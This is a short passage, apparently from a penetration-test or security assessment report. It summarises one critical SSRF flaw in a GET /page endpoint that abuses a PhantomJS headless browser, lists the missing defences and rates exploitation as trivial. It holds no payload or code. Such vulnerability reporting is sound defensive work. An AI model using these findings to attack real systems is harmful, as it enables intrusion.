**Total SSRF Sinks Found:** 1 critical

**Attack Surface:** Single endpoint (`GET /page`) enables server-side requests to arbitrary destinations via PhantomJS headless browser exploitation.

**Exploitation Requirements:**
- No authentication required
- No CAPTCHA or rate limiting
- No IP-based restrictions
- No Web Application Firewall (WAF)

**Exploitation Difficulty:** Trivial (1-minute manual exploit, easily automated)

---